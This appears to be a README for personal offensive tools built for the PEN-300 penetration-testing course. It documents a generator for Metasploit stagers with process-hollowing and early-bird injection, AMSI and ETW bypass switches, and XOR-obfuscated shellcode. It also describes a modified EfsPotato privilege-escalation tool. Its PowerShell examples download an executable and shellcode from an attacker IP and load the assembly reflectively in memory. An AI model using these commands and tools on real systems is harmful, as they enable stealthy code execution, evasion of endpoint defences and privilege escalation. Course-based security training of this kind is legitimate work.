# Tools for my PEN-300 course

* Update `interface` and `lport` in `config.yml` to your MSF (or other C2) listening IP and port before crafting any tools.
* By default, staged payloads will pull from the following URL `http://(LHOST)/sc`.
* Stageless payloads will automatically apply an XOR encryption to obfuscate the shellcode.

## MSF Stager

```
usage: generate_win_msf_stager.py [-h]
                                  [--injection {hollow,interprocess,earlybird,standard}]
                                  [--format {exe,dll}]
                                  [--heuristics | --no-heuristics]
                                  [--amsi | --no-amsi] [--etw | --no-etw]
                                  [--stageless | --no-stageless]

optional arguments:
  -h, --help            show this help message and exit
  --injection {hollow,interprocess,earlybird,standard}, -i {hollow,interprocess,earlybird,standard}
  --format {exe,dll}, -f {exe,dll}
  --heuristics, --no-heuristics
  --amsi, --no-amsi
  --etw, --no-etw
  --stageless, --no-stageless
```

## Examples

```sh
# Create a dll that will use hollowing to load shellcode
python3 generate_win_msf_stager.py --injection hollow --format dll

# Create a stageless exe that will load and run shellcode within the same process
python3 generate_win_msf_stager.py --stageless --format exe
```

## EFSPotato Local Priv Escalation
The code is forked from https://github.com/zcgonvh/EfsPotato

I modified it to pull shellcode from the URL specified in the first argument, and then use process hollowing
to start an svchost.exe process and inject the shellcode into it.

### Standard Execution
```powershell
wget http://10.10.14.110/EfsPotato.exe -o C:\windows\tasks\EfsPotato.exe
C:\windows\tasks\EfsPotato.exe http://10.10.14.110/shellcode
```

### Using Assembly Reflection
```powershell
$u="http://10.10.14.110/EfsPotato.exe"
$b=(New-object system.net.webclient).DownloadData($u)
$a=[System.Reflection.Assembly]::Load($b)
[EfsPotato.Program]::Main("http://10.10.14.110/shellcode")
```
